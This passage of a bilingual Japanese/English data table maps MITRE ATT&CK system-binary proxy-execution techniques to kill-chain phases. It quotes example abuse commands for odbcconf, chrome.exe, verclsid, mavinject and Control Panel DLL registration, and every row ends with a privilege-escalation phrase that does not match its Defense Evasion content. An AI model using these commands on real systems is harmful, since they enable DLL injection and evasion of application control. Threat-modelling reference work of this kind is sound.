攻撃者はodbcconf.exeを悪用して、その潜在的な悪用を考慮していないアプリケーション制御ソリューションをバイパスする可能性があります。[Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様に、odbcconf.exeにはDLLを実行するために悪用される可能性のある<code>REGSVR</code>フラグがあります（例：<code>odbcconf.exe /S /A &lbrace;REGSVR \""C:\\Users\\Public\\file.dll\""&rbrace;</code>）。(引用: LOLBAS Odbcconf)(引用: TrendMicro Squiblydoo Aug 2017)(引用: TrendMicro Cobalt Group Nov 2017)","Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \""C:\\Users\\Public\\file.dll\""&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.015,Electronアプリケーション,Electron Applications,"攻撃者はElectronフレームワークのコンポーネントを悪用して悪意のあるコードを実行する可能性があります。Electronフレームワークは、Signal、Slack、Microsoft Teamsなどの多くの一般的なアプリケーションをホストしています。(引用: Electron 2) 元々はGitHubによって開発されたElectronは、JavaScript、HTML、CSSなどのWebテクノロジを採用したクロスプラットフォームデスクトップアプリケーション開発フレームワークです。(引用: Electron 3) ChromiumエンジンはWebコンテンツを表示するために使用され、Node.jsはバックエンドコードを実行します。(引用: Electron 1)

Electronの機能的な仕組み（アプリが任意のコマンドを実行できるようにするなど）により、攻撃者はフレームワーク内の正当なツールになりすまして、バックグラウンドで悪意のある機能を実行できる可能性もあります。(引用: Electron 1) 例えば、`teams.exe`や`chrome.exe`の悪用により、攻撃者は正当なアプリケーションの子プロセスとして悪意のあるコマンドを実行できる可能性があります（例：`chrome.exe --disable-gpu-sandbox --gpu-launcher=\""C:\\Windows\\system32\\cmd.exe /c calc.exe`）。(引用: Electron 6-8)

攻撃者はまた、Electronアプリケーション内に悪意のある[JavaScript](https://attack.mitre.org/techniques/T1059/007)を仕込むことにより、悪意のあるコンテンツを実行する可能性があります。(引用: Electron Security)","Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)

Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\""C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)

Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.012,Verclsid,Verclsid,"攻撃者はverclsid.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Verclsid.exeは、Extension CLSID Verification Hostとして知られており、Windows ExplorerまたはWindows Shellによって使用される前に各シェル拡張機能を検証する責任があります。(引用: WinOSBite verclsid.exe)

攻撃者はverclsid.exeを悪用して悪意のあるペイロードを実行する可能性があります。これは、ファイルがクラスID（CLSID）（COMオブジェクトを識別するために使用される一意の識別番号）によって参照される<code>verclsid.exe /S /C {CLSID}</code>を実行することによって達成される場合があります。verclsid.exeによって実行されるCOMペイロードは、リモートサーバーからCOMスクリプトレット（SCT）をロードして実行するなど（[Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様）、さまざまな悪意のあるアクションを実行できる可能性があります。バイナリがWindowsシステム上で署名済みおよび/またはネイティブである可能性があるため、verclsid.exeを介した実行のプロキシは、その潜在的な悪用を考慮していないアプリケーション制御ソリューションをバイパスする可能性があります。(引用: LOLBAS Verclsid)(引用: Red Canary Verclsid.exe)(引用: BOHOPS Abusing the COM Registry)(引用: Nick Tyrer GitHub)","Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)

Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.013,Mavinject,Mavinject,"攻撃者はmavinject.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Mavinject.exeはMicrosoft Application Virtualization Injectorであり、Microsoft Application Virtualization（App-V）の一部として外部プロセスにコードを注入できるWindowsユーティリティです。(引用: LOLBAS Mavinject)

攻撃者はmavinject.exeを悪用して、実行中のプロセスに悪意のあるDLLを注入し（つまり[ダイナミックリンクライブラリインジェクション](https://attack.mitre.org/techniques/T1055/001)）、任意のコード実行を可能にする可能性があります（例：<code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。(引用: ATT Lazarus TTP Evolution)(引用: Reaqta Mavinject) mavinject.exeはMicrosoftによってデジタル署名されている可能性があるため、このメソッドを介した実行のプロキシは、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性があります。

[ダイナミックリンクライブラリインジェクション](https://attack.mitre.org/techniques/T1055/001)に加えて、Mavinject.exeは、その<code>/HMODULE</code>コマンドラインパラメータを介してインポート記述子インジェクションを実行するためにも悪用される可能性があります（例：<code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。このコマンドは、指定されたDLLからなるインポートテーブルエントリを、指定されたベースアドレスのモジュールに注入します。(引用: Mavinject Functionality Deconstructed)","Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)

Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.

In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.002,コントロールパネル,Control Panel,"攻撃者はcontrol.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Windowsコントロールパネルプロセスバイナリ（control.exe）は、ユーザーがコンピュータの設定を表示および調整できるようにするユーティリティであるコントロールパネルアイテムの実行を処理します。

コントロールパネルアイテムは、登録済みの実行可能ファイル（.exe）またはコントロールパネル（.cpl）ファイルであり、後者は実際には<code>CPlApplet</code>関数をエクスポートする名前変更されたダイナミックリンクライブラリ（.dll）ファイルです。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014) 使いやすさのために、コントロールパネルアイテムには通常、登録されてコントロールパネルにロードされた後にユーザーが利用できるグラフィカルメニューが含まれています。(引用: Microsoft Implementing CPL) コントロールパネルアイテムは、コマンドラインから直接実行したり、アプリケーションプログラミングインターフェイス（API）呼び出しを介してプログラムで実行したり、ファイルをダブルクリックするだけで実行したりできます。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)

悪意のあるコントロールパネルアイテムは、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーンを介して配信されたり(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)、多段階マルウェアの一部として実行されたりする可能性があります。(引用: Palo Alto Reaver Nov 2017) コントロールパネルアイテム、特にCPLファイルは、アプリケーションやファイル拡張子の許可リストもバイパスする可能性があります。

攻撃者はまた、悪意のあるDLLファイル（.dll）の名前をコントロールパネルファイル拡張子（.cpl）に変更し、それらを<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>に登録する可能性があります。これらの登録済みDLLがCPLファイル仕様に準拠せず、<code>CPlApplet</code>関数をエクスポートしない場合でも、コントロールパネルの実行時に<code>DllEntryPoint</code>を介してロードおよび実行されます。<code>CPlApplet</code>をエクスポートしないCPLファイルは直接実行できません。(引用: ESET InvisiMole June 2020)","Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.001,コンパイル済みHTMLファイル,Compiled HTML File,"攻撃者はコンパイル済みHTMLファイル（.chm）を悪用して悪意のあるコードを隠蔽する可能性があります。CHMファイルは、Microsoft HTMLヘルプシステムの一部として一般的に配布されます。CHMファイルは、HTMLドキュメント、画像、VBA、JScript、Java、ActiveXなどのスクリプト/Web関連プログラミング言語など、さまざまなコンテンツの圧縮コンパイルです。(引用: Microsoft HTML Help May 2018) CHMコンテンツは、HTMLヘルプ実行可能プログラム（hh.exe）によってロードされるInternet Explorerブラウザの基盤となるコンポーネントを使用して表示されます。(引用: Microsoft HTML Help ActiveX)(引用: Microsoft HTML Help Executable Program)

埋め込みペイロードを含むカスタムCHMファイルが被害者に配信され、[ユーザー実行](https://attack.mitre.org/techniques/T1204)によってトリガーされる可能性があります。CHM実行はまた、hh.exeを介したバイナリの実行を考慮していない古いおよび/またはパッチが適用されていないシステムでアプリケーション制御をバイパスする可能性もあります。(引用: MsitPros CHM Aug 2017)(引用: Microsoft CVE-2017-8625 Aug 2017)","Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.010,Regsvr32,Regsvr32,"攻撃者はRegsvr32.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Regsvr32.exeは、Windowsシステム上のダイナミックリンクライブラリ（DLL）を含むオブジェクトリンクおよび埋め込みコントロールを登録および登録解除するために使用されるコマンドラインプログラムです。Regsvr32.exeバイナリはMicrosoftによって署名されている場合もあります。(引用: Microsoft Regsvr32)

